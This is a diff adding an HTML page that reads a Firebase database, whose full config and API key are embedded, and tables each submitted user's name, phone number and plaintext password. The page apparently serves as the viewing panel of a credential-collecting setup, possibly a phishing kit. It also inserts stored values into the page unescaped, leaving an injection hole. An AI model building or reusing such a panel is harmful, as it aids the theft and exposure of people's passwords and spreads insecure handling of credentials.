@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>📋 View Submissions</title>
+  <style>
+    body {
+      font-family: Arial;
+      background: #f9f9f9;
+      padding: 20px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: white;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 10px;
+      text-align: left;
+    }
+    th {
+      background: #007bff;
+      color: white;
+    }
+    tr:nth-child(even) {
+      background: #f2f2f2;
+    }
+    h2 {
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <h2>🧾 Submitted User Data</h2>
+  <table id="dataTable">
+    <thead>
+      <tr>
+        <th>Name</th>
+        <th>Phone</th>
+        <th>Password</th>
+      </tr>
+    </thead>
+    <tbody>
+      <!-- Data rows will be inserted here -->
+    </tbody>
+  </table>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
+    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDQBcco2s6QzYZLAde67vx4MwnvzMo_hk4",
+      authDomain: "xznantor07-48133.firebaseapp.com",
+      databaseURL: "https://xznantor07-48133-default-rtdb.firebaseio.com",
+      projectId: "xznantor07-48133",
+      storageBucket: "xznantor07-48133.appspot.com",
+      messagingSenderId: "941859261907",
+      appId: "1:941859261907:web:9c8d39adc4c44456c6b326",
+      measurementId: "G-JEKMS1EMWY"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    const dataRef = ref(database, 'data');
+
+    const tableBody = document.querySelector('#dataTable tbody');
+
+    onValue(dataRef, (snapshot) => {
+      tableBody.innerHTML = ''; // Clear old data
+      const data = snapshot.val();
+
+      for (const id in data) {
+        const { name, phone, password } = data[id];
+        const row = `
+          <tr>
+            <td>${name}</td>
+            <td>${phone}</td>
+            <td>${password}</td>
+          </tr>`;
+        tableBody.insertAdjacentHTML('beforeend', row);
+      }
+    });
+  </script>
+</body>
+</html>
